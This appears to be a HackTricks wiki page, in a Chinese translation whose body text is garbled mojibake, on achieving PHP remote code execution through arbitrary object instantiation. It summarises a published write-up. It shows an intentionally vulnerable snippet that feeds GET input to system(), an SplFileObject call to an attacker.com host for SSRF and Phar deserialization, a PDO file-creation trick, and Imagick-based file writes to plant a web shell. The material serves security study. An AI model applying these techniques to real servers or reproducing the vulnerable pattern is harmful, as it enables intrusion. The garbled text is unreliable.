# PHP - RCE abusing object creation: new $\_GET\["a"]\($\_GET\["b"])

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

è¿™åŸºæœ¬ä¸Šæ˜¯å¯¹ [https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/) çš„æ€»ç»“

## ä»‹ç»

åˆ›å»ºæ–°çš„ä»»æ„å¯¹è±¡ï¼Œä¾‹å¦‚ `new $_GET["a"]($_GET["a"])`ï¼Œå¯èƒ½å¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)ï¼Œè¯¦ç»†ä¿¡æ¯è§ [**å†™ä½œ**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)ã€‚æœ¬æ–‡æ¡£å¼ºè°ƒäº†å®ç° RCE çš„å„ç§ç­–ç•¥ã€‚

## é€šè¿‡è‡ªå®šä¹‰ç±»æˆ–è‡ªåŠ¨åŠ è½½å®ç° RCE

è¯­æ³• `new $a($b)` ç”¨äºå®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡ï¼Œå…¶ä¸­ **`$a`** ä»£è¡¨ç±»åï¼Œ**`$b`** æ˜¯ä¼ é€’ç»™æ„é€ å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°ã€‚è¿™äº›å˜é‡å¯ä»¥æ¥è‡ªç”¨æˆ·è¾“å…¥ï¼Œå¦‚ GET/POSTï¼Œå®ƒä»¬å¯ä»¥æ˜¯å­—ç¬¦ä¸²æˆ–æ•°ç»„ï¼Œæˆ–æ¥è‡ª JSONï¼Œå®ƒä»¬å¯èƒ½å‘ˆç°ä¸ºå…¶ä»–ç±»å‹ã€‚

è€ƒè™‘ä¸‹é¢çš„ä»£ç ç‰‡æ®µï¼š
```php
class App {
function __construct ($cmd) {
system($cmd);
}
}

class App2 {
function App2 ($cmd) {
system($cmd);
}
}

$a = $_GET['a'];
$b = $_GET['b'];

new $a($b);
```
åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå°† `$a` è®¾ç½®ä¸º `App` æˆ– `App2`ï¼Œå¹¶å°† `$b` è®¾ç½®ä¸ºç³»ç»Ÿå‘½ä»¤ï¼ˆä¾‹å¦‚ï¼Œ`uname -a`ï¼‰ä¼šå¯¼è‡´è¯¥å‘½ä»¤çš„æ‰§è¡Œã€‚

**è‡ªåŠ¨åŠ è½½å‡½æ•°** å¯ä»¥è¢«åˆ©ç”¨ï¼Œå¦‚æœæ²¡æœ‰è¿™æ ·çš„ç±»å¯ä»¥ç›´æ¥è®¿é—®ã€‚è¿™äº›å‡½æ•°åœ¨éœ€è¦æ—¶ä¼šè‡ªåŠ¨ä»æ–‡ä»¶åŠ è½½ç±»ï¼Œå¹¶ä½¿ç”¨ `spl_autoload_register` æˆ– `__autoload` å®šä¹‰ï¼š
```php
spl_autoload_register(function ($class_name) {
include './../classes/' . $class_name . '.php';
});

function __autoload($class_name) {
include $class_name . '.php';
};

spl_autoload_register();
```
autoloadingçš„è¡Œä¸ºå› PHPç‰ˆæœ¬è€Œå¼‚ï¼Œæä¾›ä¸åŒçš„RCEå¯èƒ½æ€§ã€‚

## é€šè¿‡å†…ç½®ç±»è¿›è¡ŒRCE

åœ¨ç¼ºä¹è‡ªå®šä¹‰ç±»æˆ–è‡ªåŠ¨åŠ è½½å™¨çš„æƒ…å†µä¸‹ï¼Œ**å†…ç½®PHPç±»**å¯èƒ½è¶³ä»¥å®ç°RCEã€‚è¿™äº›ç±»çš„æ•°é‡æ ¹æ®PHPç‰ˆæœ¬å’Œæ‰©å±•çš„ä¸åŒè€Œåœ¨100åˆ°200ä¹‹é—´ã€‚å¯ä»¥ä½¿ç”¨`get_declared_classes()`åˆ—å‡ºå®ƒä»¬ã€‚

å¯ä»¥é€šè¿‡åå°„APIè¯†åˆ«æ„Ÿå…´è¶£çš„æ„é€ å‡½æ•°ï¼Œå¦‚ä»¥ä¸‹ç¤ºä¾‹å’Œé“¾æ¥æ‰€ç¤º [https://3v4l.org/2JEGF](https://3v4l.org/2JEGF)ã€‚

**é€šè¿‡ç‰¹å®šæ–¹æ³•è¿›è¡ŒRCEåŒ…æ‹¬ï¼š**

### **SSRF + Pharååºåˆ—åŒ–**

`SplFileObject`ç±»é€šè¿‡å…¶æ„é€ å‡½æ•°å¯ç”¨SSRFï¼Œå…è®¸è¿æ¥åˆ°ä»»ä½•URLï¼š
```php
new SplFileObject('http://attacker.com/');
```
SSRF å¯ä»¥å¯¼è‡´åœ¨ PHP 8.0 ä¹‹å‰çš„ç‰ˆæœ¬ä¸­ä½¿ç”¨ Phar åè®®çš„ååºåˆ—åŒ–æ”»å‡»ã€‚

### **åˆ©ç”¨ PDOs**

PDO ç±»æ„é€ å‡½æ•°å…è®¸é€šè¿‡ DSN å­—ç¬¦ä¸²è¿æ¥åˆ°æ•°æ®åº“ï¼Œå¯èƒ½ä¼šå¯ç”¨æ–‡ä»¶åˆ›å»ºæˆ–å…¶ä»–äº¤äº’ï¼š
```php
new PDO("sqlite:/tmp/test.txt")
```
### **SoapClient/SimpleXMLElement XXE**

PHP ç‰ˆæœ¬é«˜è¾¾ 5.3.22 å’Œ 5.4.12 æ˜“å—é€šè¿‡ `SoapClient` å’Œ `SimpleXMLElement` æ„é€ å‡½æ•°çš„ XXE æ”»å‡»ï¼Œå…·ä½“å–å†³äº libxml2 çš„ç‰ˆæœ¬ã€‚

## RCE via Imagick Extension

åœ¨å¯¹ **é¡¹ç›®ä¾èµ–** çš„åˆ†æä¸­ï¼Œå‘ç° **Imagick** å¯ä»¥é€šè¿‡å®ä¾‹åŒ–æ–°å¯¹è±¡æ¥å®ç° **å‘½ä»¤æ‰§è¡Œ**ã€‚è¿™ä¸ºåˆ©ç”¨æ¼æ´æä¾›äº†æœºä¼šã€‚

### VID parser

è¯†åˆ«åˆ° VID è§£æå™¨å…·æœ‰å°†å†…å®¹å†™å…¥æ–‡ä»¶ç³»ç»Ÿä¸­ä»»ä½•æŒ‡å®šè·¯å¾„çš„èƒ½åŠ›ã€‚è¿™å¯èƒ½å¯¼è‡´åœ¨å¯é€šè¿‡ç½‘ç»œè®¿é—®çš„ç›®å½•ä¸­æ”¾ç½® PHP shellï¼Œä»è€Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)ã€‚

#### VID Parser + File Upload

æ³¨æ„åˆ° PHP ä¼šå°†ä¸Šä¼ çš„æ–‡ä»¶ä¸´æ—¶å­˜å‚¨åœ¨ `/tmp/phpXXXXXX` ä¸­ã€‚Imagick ä¸­çš„ VID è§£æå™¨åˆ©ç”¨ **msl** åè®®ï¼Œå¯ä»¥å¤„ç†æ–‡ä»¶è·¯å¾„ä¸­çš„é€šé…ç¬¦ï¼Œä¾¿äºå°†ä¸´æ—¶æ–‡ä»¶è½¬ç§»åˆ°é€‰å®šä½ç½®ã€‚è¿™ç§æ–¹æ³•æä¾›äº†åœ¨æ–‡ä»¶ç³»ç»Ÿå†…å®ç°ä»»æ„æ–‡ä»¶å†™å…¥çš„é¢å¤–é€”å¾„ã€‚

### PHP Crash + Brute Force

åœ¨ [**åŸå§‹å†™ä½œ**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/) ä¸­æè¿°çš„æ–¹æ³•æ¶‰åŠä¸Šä¼ è§¦å‘æœåŠ¡å™¨å´©æºƒçš„æ–‡ä»¶ï¼Œç„¶åå†åˆ é™¤ã€‚é€šè¿‡æš´åŠ›ç ´è§£ä¸´æ—¶æ–‡ä»¶çš„åç§°ï¼ŒImagick å¯ä»¥æ‰§è¡Œä»»æ„ PHP ä»£ç ã€‚ç„¶è€Œï¼Œå‘ç°è¿™ç§æŠ€æœ¯ä»…åœ¨è¿‡æ—¶çš„ ImageMagick ç‰ˆæœ¬ä¸­æœ‰æ•ˆã€‚

## References

* [https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
